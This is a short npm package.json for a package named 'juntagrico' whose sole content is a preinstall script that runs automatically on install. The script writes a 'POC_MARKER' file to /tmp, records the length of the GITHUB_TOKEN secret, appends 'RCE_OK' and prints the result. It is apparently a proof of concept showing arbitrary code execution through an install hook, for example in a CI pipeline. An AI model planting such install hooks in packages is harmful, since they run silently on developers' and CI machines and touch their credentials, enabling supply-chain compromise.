{
  "name": "juntagrico",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "echo POC_MARKER_JUNTAGRICO > /tmp/POC_MARKER_JUNTAGRICO.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_JUNTAGRICO.txt; echo RCE_OK >> /tmp/POC_MARKER_JUNTAGRICO.txt; cat /tmp/POC_MARKER_JUNTAGRICO.txt"
  }
}